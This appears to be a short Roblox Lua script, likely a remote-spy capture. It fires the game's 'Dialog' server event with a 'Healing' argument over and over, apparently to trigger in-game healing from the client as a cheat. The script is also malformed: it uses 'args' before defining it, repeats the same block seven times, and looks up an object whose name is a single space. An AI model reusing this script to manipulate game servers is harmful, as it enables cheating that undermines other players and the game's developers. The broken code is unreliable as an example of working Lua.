game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

